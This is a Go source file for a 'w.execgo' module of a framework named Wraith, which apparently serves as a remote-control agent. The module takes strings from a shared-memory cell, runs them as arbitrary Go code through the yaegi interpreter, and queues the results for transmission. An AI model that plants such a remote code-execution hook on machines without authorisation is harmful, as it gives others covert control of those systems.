package stdmod

import (
	"context"
	"fmt"
	"sync"

	"git.0x1a8510f2.space/0x1a8510f2/wraith/wraith/libwraith"
	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
)

const (
	ExecGoModule_SHM_EXECUTE = "w.execgo.execute"
)

type ExecGoModule struct {
	mutex sync.Mutex
}

func (m *ExecGoModule) Mainloop(ctx context.Context, w *libwraith.Wraith) error {
	// Ensure this instance is only started once and mark as running if so
	single := m.mutex.TryLock()
	if !single {
		return fmt.Errorf("already running")
	}
	defer m.mutex.Unlock()

	// Watch a memory cell for stuff to execute
	execCellWatch, execCellWatchId := w.SHMWatch(ExecGoModule_SHM_EXECUTE)

	// Always cleanup SHM when exiting
	defer func() {
		// Unwatch cells
		w.SHMUnwatch(ExecGoModule_SHM_EXECUTE, execCellWatchId)
	}()

	// Mainloop
	for {
		select {
		// Trigger exit when requested
		case <-ctx.Done():
			return nil
		// Manage w.debug watch
		case value := <-execCellWatch:
			// Make sure the value is a string. If not, ignore it.
			code, ok := value.(string)
			if !ok {
				continue
			}

			// Initialise yaegi to handle commands
			i := interp.New(interp.Options{})
			i.Use(stdlib.Symbols)

			// The code should generate a function called "f" to be executed.
			// That function should return some value which is used as the result. If no
			// result is to be returned, the function should return `nil`.
			_, err := i.Eval(code)
			if err != nil {
				w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("w.execgo error while evaluating code: %w", err))
				continue
			}

			fnv, err := i.Eval("f")
			if err != nil {
				w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("w.execgo error while evaluating f: %w", err))
				continue
			}

			fn, ok := fnv.Interface().(func() any)
			if !ok {
				w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("w.execgo f has incorrect type"))
				continue
			}

			// Execute the function and send the result if one is returned
			result := fn()
			if result != nil {
				w.SHMSet(libwraith.SHM_TX_QUEUE, result)
			}
		}
	}
}

func (m *ExecGoModule) WraithModuleName() string {
	return "w.execgo"
}
